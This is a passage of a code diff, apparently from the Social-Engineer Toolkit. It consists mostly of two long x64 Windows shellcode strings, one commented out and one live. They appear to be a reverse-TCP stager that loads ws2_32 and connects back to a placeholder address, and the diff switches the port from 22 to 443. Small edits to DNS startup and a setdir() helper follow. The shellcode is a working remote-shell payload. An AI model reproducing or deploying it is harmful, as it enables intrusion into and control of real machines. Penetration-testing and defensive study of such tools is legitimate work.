a\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41\xff\xe7"
+        #shellcode = r"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x00\x16\xff\xfe\xfd\xfc\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41\xff\xe7"
+
+        shellcode = r"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xff\xfe\xfd\xfc\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41\xff\xe7"
 
     return shellcode
 
@@ -1452,8 +1407,13 @@ def dns():
 
 # start dns with multiprocessing
 def start_dns():
-    dns_check = check_config("DNS_SERVER=")
-    if dns_check.lower() == "on":
 		thread.start_new_thread(dns,())
 
-
+# the main ~./set path for SET 
+def setdir():
+    if check_os() == "posix":
+        return os.getenv("HOME") + "/.set"
+    if check_os() == "windows":
+        return "src/program_junk/"
+# set the main directory for SET 
+setdir = setdir()
